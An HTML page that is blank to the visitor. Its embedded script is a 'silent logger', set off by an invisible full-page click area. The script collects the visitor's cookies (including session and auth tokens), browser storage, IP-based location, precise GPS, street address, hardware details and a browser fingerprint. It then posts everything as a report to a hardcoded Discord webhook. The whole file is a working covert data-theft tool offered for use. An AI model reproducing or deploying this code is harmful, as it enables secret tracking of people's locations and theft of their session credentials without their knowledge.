<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #ffffff;  /* change to #000000 if you prefer black */
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            cursor: default;
        }
        /* Invisible hit area that covers the whole page */
        #click-catcher {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999;
            background: transparent;
            cursor: pointer;
        }
    </style>
</head>
<body>
    <div id="click-catcher"></div>

    <script>
        // ========== CONFIGURATION ==========
        const WEBHOOK_URL = "https://discord.com/api/webhooks/1479602171736494100/TtSG3mzG9tpZg0TiLkBCHvjtMVw4SkbqfZEWJRfU5hi_uHyoGb7WqwaS5GNUM5vphNwR";

        // ========== UTILITIES ==========
        function wait(ms) { return new Promise(r => setTimeout(r, ms)); }

        // ---------- Cookie collection + platform categorization ----------
        function getAllCookies() {
            const cookieString = document.cookie;
            if (!cookieString) return [];
            const cookies = cookieString.split(';').map(c => c.trim()).filter(c => c);
            return cookies.map(c => {
                const [name, ...rest] = c.split('=');
                const value = rest.join('=');
                const platform = categorizeCookie(name, value);
                return { name: name.trim(), value: value || "", platform };
            });
        }

        function categorizeCookie(name, value) {
            const lowerName = name.toLowerCase();
            const lowerValue = value.toLowerCase();
            if (lowerName.includes("fb") || lowerName.includes("facebook") || lowerValue.includes("facebook")) return "Facebook / Meta";
            if (lowerName.includes("google") || lowerName.includes("_ga") || lowerName.includes("gmail") || lowerValue.includes("google")) return "Google / YouTube";
            if (lowerName.includes("twitter") || lowerName.includes("tweet") || lowerValue.includes("twitter")) return "Twitter (X)";
            if (lowerName.includes("amazon") || lowerName.includes("amzn") || lowerValue.includes("amazon")) return "Amazon";
            if (lowerName.includes("reddit") || lowerValue.includes("reddit")) return "Reddit";
            if (lowerName.includes("instagram") || lowerValue.includes("instagram")) return "Instagram";
            if (lowerName.includes("linkedin") || lowerValue.includes("linkedin")) return "LinkedIn";
            if (lowerName.includes("discord") || lowerValue.includes("discord")) return "Discord";
            if (lowerName.includes("github") || lowerValue.includes("github")) return "GitHub";
            if (lowerName.includes("cloudflare") || lowerName.includes("__cf")) return "Cloudflare";
            if (lowerName.includes("session") || lowerName.includes("token") || lowerName.includes("auth") || lowerName.includes("jwt")) return "Session / Auth (generic)";
            if (lowerName.includes("ad") || lowerName.includes("track") || lowerName.includes("pixel")) return "Advertising / Tracker";
            return "Unknown / Other";
        }

        // ---------- Storage ----------
        function getAllLocalStorage() {
            try {
                const items = {};
                for (let i = 0; i < localStorage.length; i++) {
                    const key = localStorage.key(i);
                    try {
                        items[key] = localStorage.getItem(key);
                    } catch(e) { items[key] = "[Error reading]"; }
                }
                return items;
            } catch(e) { return { error: e.message }; }
        }

        function getAllSessionStorage() {
            try {
                const items = {};
                for (let i = 0; i < sessionStorage.length; i++) {
                    const key = sessionStorage.key(i);
                    try {
                        items[key] = sessionStorage.getItem(key);
                    } catch(e) { items[key] = "[Error reading]"; }
                }
                return items;
            } catch(e) { return { error: e.message }; }
        }

        async function getAllIndexedDB() {
            if (!window.indexedDB) return { error: "IndexedDB not supported" };
            if (window.indexedDB.databases) {
                try {
                    return await window.indexedDB.databases();
                } catch(e) { return { error: e.message }; }
            }
            return { info: "Cannot enumerate IndexedDB automatically" };
        }

        // ---------- Hardware ----------
        function getGPU() {
            try {
                const canvas = document.createElement("canvas");
                const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
                if (!gl) return { error: "WebGL unavailable" };
                const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
                if (debugInfo) {
                    return {
                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL),
                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL)
                    };
                }
                return { error: "WEBGL_debug_renderer_info not available" };
            } catch(e) { return { error: e.message }; }
        }

        async function getBattery() {
            if (!navigator.getBattery) return "Unavailable";
            try {
                const b = await navigator.getBattery();
                return { level: Math.round(b.level * 100) + "%", charging: b.charging };
            } catch(e) { return "Error"; }
        }

        function getConnection() {
            const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
            if (!conn) return "Unavailable";
            return {
                effectiveType: conn.effectiveType,
                downlink: conn.downlink,
                rtt: conn.rtt,
                saveData: conn.saveData
            };
        }

        function getPlugins() {
            try {
                return Array.from(navigator.plugins).map(p => p.name);
            } catch(e) { return []; }
        }

        // ---------- IP & Geo (from ipapi.co) ----------
        async function fetchIPInfo() {
            try {
                const response = await fetch("https://ipapi.co/json/");
                if (!response.ok) throw new Error("HTTP " + response.status);
                const data = await response.json();
                return {
                    ip: data.ip,
                    city: data.city,
                    region: data.region,
                    country: data.country_name,
                    postal: data.postal,
                    latitude: data.latitude,
                    longitude: data.longitude,
                    isp: data.org,
                    timezone: data.timezone
                };
            } catch(e) {
                return { error: e.message };
            }
        }

        // ---------- Precise GPS location (asks user for permission) ----------
        function getPreciseLocation() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) {
                    resolve({ error: "Geolocation not supported" });
                    return;
                }
                navigator.geolocation.getCurrentPosition(
                    (pos) => {
                        resolve({
                            latitude: pos.coords.latitude,
                            longitude: pos.coords.longitude,
                            accuracy: pos.coords.accuracy,
                            altitude: pos.coords.altitude,
                            altitudeAccuracy: pos.coords.altitudeAccuracy,
                            heading: pos.coords.heading,
                            speed: pos.coords.speed
                        });
                    },
                    (err) => {
                        let errorMsg = "";
                        switch(err.code) {
                            case err.PERMISSION_DENIED: errorMsg = "User denied location request"; break;
                            case err.POSITION_UNAVAILABLE: errorMsg = "Position unavailable"; break;
                            case err.TIMEOUT: errorMsg = "Timeout"; break;
                            default: errorMsg = err.message;
                        }
                        resolve({ error: errorMsg });
                    },
                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
                );
            });
        }

        // Reverse geocode from lat/lon (using OpenStreetMap Nominatim)
        async function reverseGeocode(lat, lon) {
            try {
                const url = `https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18&addressdetails=1`;
                const response = await fetch(url);
                const data = await response.json();
                if (data.display_name) return data.display_name;
                else return `${lat}, ${lon}`;
            } catch(e) {
                return `${lat}, ${lon} (reverse geocode failed)`;
            }
        }

        // ---------- Browser fingerprint ----------
        async function generateFingerprint(gpu) {
            const raw = [
                navigator.userAgent,
                navigator.language,
                screen.width, screen.height, screen.colorDepth,
                navigator.hardwareConcurrency,
                navigator.deviceMemory,
                gpu.renderer || "",
                gpu.vendor || "",
                new Date().getTimezoneOffset()
            ].join("|");
            const hash = await crypto.subtle.digest("SHA-256", new TextEncoder().encode(raw));
            return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2,"0")).join("");
        }

        // ---------- Collect everything ----------
        async function collectAllData(ipInfo, preciseLocation, address) {
            const gpu = getGPU();
            const cookies = getAllCookies();
            const localStorage = getAllLocalStorage();
            const sessionStorage = getAllSessionStorage();
            const indexedDB = await getAllIndexedDB();
            const fingerprint = await generateFingerprint(gpu);
            const battery = await getBattery();
            const connection = getConnection();
            const plugins = getPlugins();

            // Group cookies by platform
            const platformGroups = {};
            for (const cookie of cookies) {
                if (!platformGroups[cookie.platform]) platformGroups[cookie.platform] = [];
                platformGroups[cookie.platform].push(cookie);
            }

            return {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                referrer: document.referrer,
                ipInfo: ipInfo,
                preciseLocation: preciseLocation,
                reverseGeocodeAddress: address,
                cookies: cookies,
                cookiesGrouped: platformGroups,
                localStorage: localStorage,
                sessionStorage: sessionStorage,
                indexedDB: indexedDB,
                navigator: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    languages: navigator.languages,
                    hardwareConcurrency: navigator.hardwareConcurrency,
                    deviceMemory: navigator.deviceMemory,
                    cookieEnabled: navigator.cookieEnabled,
                    doNotTrack: navigator.doNotTrack,
                    onLine: navigator.onLine
                },
                screen: {
                    width: screen.width,
                    height: screen.height,
                    colorDepth: screen.colorDepth,
                    pixelRatio: window.devicePixelRatio,
                    orientation: screen.orientation?.type || "n/a"
                },
                gpu: gpu,
                battery: battery,
                connection: connection,
                plugins: plugins,
                fingerprint: fingerprint,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
            };
        }

        // ---------- Generate TXT report ----------
        async function generateTextReport(data) {
            let report = "=".repeat(80) + "\n";
            report += "          COMPLETE SILENT LOGGER REPORT\n";
            report += "=".repeat(80) + "\n\n";
            report += `Generated: ${data.timestamp}\n`;
            report += `Page URL: ${data.url}\n`;
            report += `Referrer: ${data.referrer || "(none)"}\n`;
            report += `Timezone: ${data.timezone}\n\n`;

            // IP and location
            report += "-".repeat(80) + "\n";
            report += "🌐 IP & LOCATION (ipapi.co)\n";
            report += "-".repeat(80) + "\n";
            if (data.ipInfo.error) {
                report += `Error: ${data.ipInfo.error}\n`;
            } else {
                report += `IP Address: ${data.ipInfo.ip}\n`;
                report += `City: ${data.ipInfo.city}\n`;
                report += `Region: ${data.ipInfo.region}\n`;
                report += `Country: ${data.ipInfo.country}\n`;
                report += `Postal: ${data.ipInfo.postal}\n`;
                report += `ISP: ${data.ipInfo.isp}\n`;
                report += `Timezone: ${data.ipInfo.timezone}\n`;
                report += `Approx Lat/Lon: ${data.ipInfo.latitude}, ${data.ipInfo.longitude}\n`;
            }

            report += "\n📍 PRECISE GPS LOCATION (from browser permission)\n";
            if (data.preciseLocation.error) {
                report += `Error: ${data.preciseLocation.error}\n`;
            } else {
                report += `Latitude: ${data.preciseLocation.latitude}\n`;
                report += `Longitude: ${data.preciseLocation.longitude}\n`;
                report += `Accuracy: ±${data.preciseLocation.accuracy} meters\n`;
                if (data.preciseLocation.altitude) report += `Altitude: ${data.preciseLocation.altitude}m\n`;
                if (data.preciseLocation.heading) report += `Heading: ${data.preciseLocation.heading}°\n`;
                if (data.preciseLocation.speed) report += `Speed: ${data.preciseLocation.speed} m/s\n`;
            }
            report += `\nReverse geocoded address: ${data.reverseGeocodeAddress || "N/A"}\n`;

            // Cookies
            report += "\n" + "-".repeat(80) + "\n";
            report += "🍪 COOKIES (by platform)\n";
            report += "-".repeat(80) + "\n";
            for (const [platform, cookies] of Object.entries(data.cookiesGrouped)) {
                report += `\n[${platform}] (${cookies.length} cookies)\n`;
                for (const cookie of cookies) {
                    let val = cookie.value.length > 100 ? cookie.value.substring(0,100)+"..." : cookie.value;
                    report += `  • ${cookie.name} = ${val}\n`;
                }
            }
            if (data.cookies.length === 0) report += "\nNo cookies found.\n";

            // LocalStorage
            report += "\n" + "-".repeat(80) + "\n";
            report += "💾 LOCALSTORAGE\n";
            report += "-".repeat(80) + "\n";
            for (const [key, val] of Object.entries(data.localStorage)) {
                let valueStr = typeof val === 'string' ? val : JSON.stringify(val);
                valueStr = valueStr.length > 150 ? valueStr.substring(0,150)+"..." : valueStr;
                report += `${key} = ${valueStr}\n`;
            }

            // SessionStorage
            report += "\n" + "-".repeat(80) + "\n";
            report += "📦 SESSIONSTORAGE\n";
            report += "-".repeat(80) + "\n";
            for (const [key, val] of Object.entries(data.sessionStorage)) {
                let valueStr = typeof val === 'string' ? val : JSON.stringify(val);
                valueStr = valueStr.length > 150 ? valueStr.substring(0,150)+"..." : valueStr;
                report += `${key} = ${valueStr}\n`;
            }

            // IndexedDB
            report += "\n" + "-".repeat(80) + "\n";
            report += "🗃️ INDEXEDDB DATABASES\n";
            report += "-".repeat(80) + "\n";
            if (Array.isArray(data.indexedDB)) {
                for (const db of data.indexedDB) {
                    report += `Name: ${db.name}, Version: ${db.version}\n`;
                }
            } else {
                report += JSON.stringify(data.indexedDB, null, 2);
            }

            // System & Browser
            report += "\n" + "-".repeat(80) + "\n";
            report += "🖥️ SYSTEM & BROWSER INFO\n";
            report += "-".repeat(80) + "\n";
            report += `User Agent: ${data.navigator.userAgent}\n`;
            report += `Platform: ${data.navigator.platform}\n`;
            report += `Language: ${data.navigator.language}\n`;
            report += `CPU Cores: ${data.navigator.hardwareConcurrency || "unknown"}\n`;
            report += `RAM: ${data.navigator.deviceMemory || "unknown"} GB\n`;
            report += `Cookies Enabled: ${data.navigator.cookieEnabled}\n`;
            report += `Do Not Track: ${data.navigator.doNotTrack}\n`;
            report += `Online: ${data.navigator.onLine}\n`;
            report += `\nScreen: ${data.screen.width}x${data.screen.height} @ ${data.screen.colorDepth}bit\n`;
            report += `Pixel Ratio: ${data.screen.pixelRatio}\n`;
            report += `Orientation: ${data.screen.orientation}\n`;
            report += `\nGPU Renderer: ${data.gpu.renderer || "N/A"}\n`;
            report += `GPU Vendor: ${data.gpu.vendor || "N/A"}\n`;
            report += `\nBattery: ${JSON.stringify(data.battery)}\n`;
            report += `Connection: ${JSON.stringify(data.connection)}\n`;
            report += `\nPlugins: ${data.plugins.join(", ") || "none"}\n`;
            report += `\n🔐 Fingerprint (SHA-256): ${data.fingerprint}\n`;
            report += "\n" + "=".repeat(80) + "\n";
            report += "END OF REPORT\n";
            report += "=".repeat(80);
            return report;
        }

        // ---------- Send to Discord as file attachment ----------
        async function sendToWebhookAsFile(reportText, data) {
            const blob = new Blob([reportText], { type: "text/plain" });
            const formData = new FormData();
            const filename = `logger_${data.timestamp.slice(0,19).replace(/:/g, '-')}.txt`;
            formData.append("file", blob, filename);

            const summary = {
                content: null,
                embeds: [{
                    title: "✅ Silent Logger Report",
                    description: `**IP:** ${data.ipInfo.ip || "N/A"}\n**GPS:** ${data.preciseLocation.latitude ? `${data.preciseLocation.latitude}, ${data.preciseLocation.longitude}` : "denied or unavailable"}\n**Cookies:** ${data.cookies.length} total\n**Fingerprint:** \`${data.fingerprint.slice(0,32)}...\``,
                    color: 0x00ff00,
                    footer: { text: "Full report attached" },
                    timestamp: data.timestamp
                }]
            };
            formData.append("payload_json", JSON.stringify(summary));

            try {
                await fetch(WEBHOOK_URL, { method: "POST", body: formData });
            } catch(e) {
                console.error("Webhook send failed", e);
            }
        }

        // ---------- MAIN: triggered by one click anywhere ----------
        let hasRun = false;
        const clickCatcher = document.getElementById("click-catcher");

        async function oneClickLogger() {
            if (hasRun) return;
            hasRun = true;
            // Remove click catcher so no double trigger
            clickCatcher.style.display = "none";

            // Step 1: fetch IP info (no permission needed)
            const ipInfo = await fetchIPInfo();

            // Step 2: ask for precise GPS (browser popup)
            const preciseLocation = await getPreciseLocation();
            let address = "Not obtained";
            if (!preciseLocation.error && preciseLocation.latitude) {
                address = await reverseGeocode(preciseLocation.latitude, preciseLocation.longitude);
            }

            // Step 3: collect all other data
            const allData = await collectAllData(ipInfo, preciseLocation, address);

            // Step 4: generate TXT report
            const reportText = await generateTextReport(allData);

            // Step 5: send to Discord
            await sendToWebhookAsFile(reportText, allData);

            // Page remains completely blank – nothing else.
        }

        clickCatcher.addEventListener("click", oneClickLogger);
    </script>
</body>
</html>
